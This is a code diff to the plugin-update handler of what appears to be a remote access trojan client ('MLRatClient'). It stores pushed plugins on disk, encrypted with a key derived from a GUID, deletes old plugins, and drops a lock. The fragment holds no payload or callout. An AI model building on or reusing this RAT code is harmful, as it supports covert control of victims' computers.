@@ -321,26 +321,23 @@ namespace MLRatClient
 
                         if (!PluginUpdates.ContainsKey(PluginID))
                         {
-                            lock (sender)
+                            Rijndael rij = new RijndaelManaged();
+                            string encString = Guid.NewGuid().ToString("n");
+                            byte[] encryptionKey = eSock.Hashing.MD5Hash(encString);
+                            rij.Key = encryptionKey;
+                            rij.IV = encryptionKey;
+                            ICryptoTransform crypto = rij.CreateEncryptor();
+
+                            FileStream update =
+                                new FileStream(
+                                    Path.Combine(PluginBaseLocation,
+                                        string.Format("{0}.{1}", PluginID.ToString("n"), encString)), FileMode.Create);
+                            CryptoStream updateStream = new CryptoStream(update, crypto, CryptoStreamMode.Write);
+                            PluginUpdates[PluginID] = updateStream;
+                            Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
+                            if (LoadedPlugins.ContainsKey(PluginID))
                             {
-                                Rijndael rij = new RijndaelManaged();
-                                string encString = Guid.NewGuid().ToString("n");
-                                byte[] encryptionKey = eSock.Hashing.MD5Hash(encString);
-                                rij.Key = encryptionKey;
-                                rij.IV = encryptionKey;
-                                ICryptoTransform crypto = rij.CreateEncryptor();
-                                
-                                FileStream update =
-                                    new FileStream(
-                                        Path.Combine(PluginBaseLocation,
-                                            string.Format("{0}.{1}", PluginID.ToString("n"), encString)), FileMode.Create);
-                                CryptoStream updateStream = new CryptoStream(update, crypto, CryptoStreamMode.Write);
-                                PluginUpdates[PluginID] = updateStream;
-                                Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
-                                if(LoadedPlugins.ContainsKey(PluginID))
-                                {
-                                    File.Delete(LoadedPlugins[PluginID].Path);
-                                }
+                                File.Delete(LoadedPlugins[PluginID].Path);
                             }
                         }
                         Console.WriteLine("Plugin block ({0} bytes) recieved. ID: {1}", Block.Length, PluginID.ToString("n"));
